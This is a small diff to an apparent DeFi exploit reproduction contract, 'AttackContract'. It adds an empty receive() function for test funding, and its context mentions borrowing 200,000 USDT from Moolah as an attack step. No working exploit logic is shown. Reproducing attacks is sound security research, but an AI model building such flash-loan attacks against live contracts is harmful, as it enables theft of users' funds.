@@ -46,6 +46,12 @@ contract AttackContract {
     constructor() {
         owner = msg.sender;
     }
+
+    // Accepts the BNB stipend forwarded before the attack is recorded (the real
+    // test uses `vm.deal(address(attackContract), 0.01 ether)`, which sets the
+    // balance directly rather than transferring value into a receive() path).
+    receive() external payable {}
+
     function swap(address tokenIn, address tokenOut, uint256 amountIn) public {
         bytes memory data = abi.encode(tokenIn, tokenOut, amountIn);
         // Step 1: borrow 200,000 USDT from Moolah
